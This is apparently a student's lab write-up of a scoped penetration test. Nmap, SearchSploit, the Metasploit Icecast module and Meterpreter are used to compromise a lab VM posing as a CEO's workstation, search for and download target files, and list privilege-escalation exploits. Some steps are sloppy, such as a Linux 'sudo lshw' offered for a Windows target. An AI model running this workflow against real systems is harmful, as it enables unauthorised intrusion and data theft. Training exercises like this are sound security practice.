# Penetration_Test_Engagement
Internal penetration test on GoodCorp's CEO, Hans Gruber. The objective is to exploit any vulnerable software and find company files on the CEO's computer.

#### Background

- The CEO claims to have passwords that are long and complex and therefore unhackable.
- The penetration test objective is to access the CEO's computer, and using a Meterpreter session, to search for two files that contain the strings `recipe` and `seceretfile`.

#### Setup 

- Logged onto DVW10 virtual machine.
- Icecast server started to emulate the CEO's computer. 

#### Scope 

- Limited to CEO's workstation only. Only the CEO's IP address can be exploited.
- No other IP addresses to be scanned
- DOS and brute force attacks are prohibited
- No file deletions permissible
- No config changes permissible

#### Deliverable

- All findings were submitted via a report called 'Report.docx'. [Report.docx](Report.docx)

1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: 
      First, I needed to work out what IP address the CEO's computer was using. I knew that the network was using the 192.168.0.? range.
      I used 
      **nmap -sn 192.168.0.0/24**
      
      Having ruled out IP addresses using the 4th octet being 192.168.0.1, 192.168.0.10, 192.168.0.21, 192.168.0.22 and 192.168.0.8, I decided to investigate **192.168.0.20**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1702.png)      
      
      Then I used nmap
      **nmap -sV "192.168.0.20"**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1701.png)

2. Start SearchSploit

    - Run the SearchSploit commands to show available Icecast exploits.
  
      > Answer: 
      command to run is:
      **searchsploit icecast**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1703.png)
      
3. Start Metasploit

    - Run the command that starts Metasploit:
  
      > Answer: 
      command to run is:
      **msfconsole**
      
4. Search for the Icecast module and load it for use

    - Run the command that starts Metasploit:
  
      > Answer: 
      command to run is:
      **search icecast**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1705.png)
      
    - Run the command to use the Icecast module:
    
      > Answer: 
      command to run from Metasploit is:
      **use 0 (0 being the first (and in this case only) module available to be run. I used the shortcut so I did’t need to type or 'copy and paste' the full module name).**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1706.png)
      
      Next I ran the command to show what options were available within the module:
      **show options**

      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1707.png)
      
5. Set the 'RHOST' to the target machine

    - Run the command that sets the 'RHOST':
  
      > Answer: 
      command to run is:
      **set RHOSTS 192.168.0.20**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1708.png)
      
6. Run the Icecast exploit

    - Run the command that runs the Icecast exploit:
  
      > Answer: 
      command to run is:
      **run (exploit will also work)**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1709.png)
      
    - Run the command that performs a search for the `secretfile.txt` on the target:
  
      > Answer: 
      command to run is:
      **search -f *secretfile.txt**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1710.png)
      
7. Now that a Meterpreter session is open:

    - Run the command to performs a search for the `recipe.txt` on the target:
  
      > Answer: 
      command to run is:
      **search -f *recipe.txt**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1711.png)
     
    - Run the command that exfiltrates the `recipe*.txt` file:
    
      > Answer: 
      command to run is:
      **download Drinks.recipe.txt**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1712.png)
      
      **I then used the ‘cat’ command to view the contents of both .txt files. The second txt file’s contents contains bank account details.**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1713.png)      
      
      **I then checked that the file has downloaded to my Kali VM:** (using **ls** command)
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1714.png)
      
8. Use Meterpreter's local exploit suggester to find possible exploits:

    - Check for common vulnerabilities:
  
      > Results: 
      I used Meterpreter to check for common vulnerabilities. 
      using the command
      **run post/multi/recon/local_exploit_suggester**
      
      Meterpreter discovered two possible vulnerabilities:
    
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1715.png)    
      
      **The two exploits of concern are
           **•	ikeext_service**
           **•	ms16-075**

      The ikeext services exploit module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring Modules' (IKEEXT) service which runs as SYSTEM, and starts automatically in default installations of Vista-Win8. It requires an insecure bin path to plant the DLL payload.

      The ms16-075 exploit is a security update that resolves a vulnerability in Microsoft Windows that could allow elevation of privilege if an attacker logs on to the system and runs a specially crafted application.
       
#### Bonus
      
A. Run a Meterpreter post script that enumerates all logged on users.

    - **I googled meterpreter enumerate all logged on users**
    
      > Answer:
      **I found the following blog helpful, and I tested various meterpreter commands:**
      https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
      
      Meterpreter discovered two possible vulnerabilities:
    
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1716.png)   
      
B. Open a Meterpreter shell and gather system information for the target:     

      > Answer: 
      command to run is:
      **shell**
      
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1717.png)
      ![](https://github.com/paulsbarrett/Penetration_Test_Engagement/blob/images/penetration-1718.png)
      
C. Run the command that displays the target's computer system information:     

      > Answer: 
      command to run is:
      **sudo lshw**   
